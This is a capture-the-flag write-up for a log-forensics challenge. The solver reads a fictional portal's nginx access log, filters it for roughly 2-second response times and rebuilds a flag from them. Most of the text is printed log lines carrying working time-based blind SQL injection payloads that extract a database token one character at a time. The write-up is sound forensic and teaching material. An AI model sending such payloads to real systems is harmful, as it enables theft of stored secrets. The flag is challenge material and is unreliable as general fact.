---
title: The Access Log
tags: 
    - Web
---

# The Access Log

Operation Dawn, annex entry 07. The Ash Army ran a status portal for its canal checkpoint, and coalition cyber teams seized the web server's log. One visitor walked out of the portal's database with the checkpoint's link secret and never drew an error page. Recover what they took and submit it exactly as recovered. It already carries its own braces, so do not wrap it again.

The portal, its units and every host in the log are fictional. Attachment: `access.log`, 514,137 bytes, SHA-256 `3bb180802cc90b56984f179cb4315fc805d1e047e8a2374544044858fea30db2`. Each line is nginx's combined format followed by `rt=`, the request time in seconds.

Flag format: **`CSCTF{...}`**

---

After opening the file we can see a lot of `GET` request like this one :
* `198.51.100.66 - - [13/Oct/2026:03:00:31 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,6,1)='Z',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=0.057`

We can see a typical use of SQL command with python, we see the `IF(condition, true, false)` and the `SUBSTR(table, position, 1)`. After finding this we know that if rt ≥ 2 then the verification was successful at the position used in `SUBSTR`.

So we can use this command :
```bash
$ cat access.log | grep -i "rt=2"
198.51.100.66 - - [13/Oct/2026:03:00:34 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,27,1)='b',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.024
198.51.100.66 - - [13/Oct/2026:03:00:36 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,23,1)='g',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:00:39 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,16,1)='_',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.008
198.51.100.66 - - [13/Oct/2026:03:00:39 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,22,1)='i',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:00:45 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,29,1)='l',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:00:49 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,7,1)='0',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:00:50 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,35,1)='8',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:00:53 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,21,1)='v',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:00:56 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,33,1)='d',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:00:58 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,40,1)='1',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:00 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,28,1)='o',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:03 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,8,1)='7',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:13 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,26,1)='_',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:18 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,32,1)='r',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:18 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,20,1)='_',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:18 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,41,1)='%7D',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:20 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,37,1)='0',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:22 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,36,1)='c',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.010
198.51.100.66 - - [13/Oct/2026:03:01:22 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,10,1)='b',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:23 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,4,1)='T',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:26 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,13,1)='c',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:27 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,19,1)='w',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:30 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,15,1)='n',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:33 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,3,1)='C',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:37 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,24,1)='i',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:41 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,14,1)='o',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.004
198.51.100.66 - - [13/Oct/2026:03:01:42 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,2,1)='S',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:44 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,17,1)='t',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:46 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,5,1)='F',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:49 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,31,1)='a',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:01:49 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,6,1)='%7B',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:01:50 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,12,1)='a',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:02:01 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,1,1)='C',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.004
198.51.100.66 - - [13/Oct/2026:03:02:02 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,39,1)='7',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:04 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,38,1)='3',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:07 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,34,1)='_',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
198.51.100.66 - - [13/Oct/2026:03:02:08 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,18,1)='o',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:10 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,9,1)='_',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:13 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,11,1)='e',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:14 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,30,1)='l',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.003
198.51.100.66 - - [13/Oct/2026:03:02:15 +0000] "GET /api/status?unit=43'+AND+IF(SUBSTR(token,25,1)='l',SLEEP(2),0)--+- HTTP/1.1" 200 33 "-" "python-requests/2.32.3" rt=2.002
```

And we can reconstruct the flag : `CSCTF{07_beacon_tow_vigil_bollard_8c0371}`